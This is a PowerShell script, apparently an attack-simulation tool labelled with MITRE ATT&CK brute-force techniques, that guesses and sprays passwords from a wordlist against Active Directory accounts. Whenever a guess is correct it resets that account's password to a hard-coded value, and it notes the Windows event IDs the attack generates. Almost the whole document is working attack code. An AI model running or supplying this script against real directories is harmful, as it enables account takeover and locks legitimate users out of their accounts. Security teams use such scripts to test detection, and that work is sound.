<#
T1110.001 - Brute Force: Password Guessing
T1110.003 - Brute Force: Password Spraying

.Synopsis
    This script attempts to find valid credentials for a set of users by trying different passwords
    This will generate EventID 4623, 4776 and 4771 and 4724 if password reset succesfully
.DESCRIPTION
    This script takes two files as input, one with usernames and one with passwords. It then attempts 
    to authenticate each of the users with each of the passwords, and prints out any valid credentials
    that it finds.
.EXAMPLE
    .\Bruteforce_reset_attempts.ps1 -passfile .\passwords.txt -userfile .\users.txt -waitTime 1
.PARAMETER passwordsFile
    Path to the file containing the passwords
.PARAMETER usersFile
    Path to the file containing the usernames
.PARAMETER waitTime
    The amount of time (in seconds) to wait after each authentication attempt
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]$passfile,

    [Parameter(Mandatory=$true)]
    [string]$userfile,

    [Parameter(Mandatory=$false)]
    [int]$waitTime = 0
)

Import-Module .\Microsoft.ActiveDirectory.Management.dll

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force -Verbose

try {
    $oldPasswords = Get-Content $passfile
    $userNames = Get-Content $userfile
} catch {
    Write-Error -ForegroundColor Red "Error opening files. Please check if the paths are correct!"
}

$newPassword = ConvertTo-SecureString "SuperSecur3P@ssword123!" -AsPlainText -Force

if ($oldPasswords -and $userNames) {
  foreach ($userName in $userNames) {
      foreach ($oldPassword in $oldPasswords) {
          $oldPassword = ConvertTo-SecureString $oldPassword -AsPlainText -Force
          try {
              Set-ADAccountPassword -Identity $userName -OldPassword $oldPassword -NewPassword $newPassword
              Write-Host -ForegroundColor Green ("Password for " + $userName + " reset successfully with new password " + $newPassword + "old password was" + $oldPassword)
          }
          catch {
               Write-Host -ForegroundColor Red ("An error occurred for " + $userName + " with old password " + $oldPassword + ": $_")
          }
          Start-Sleep -Seconds $waitTime
      }
  }
}

Stop-Transcript -Verbose
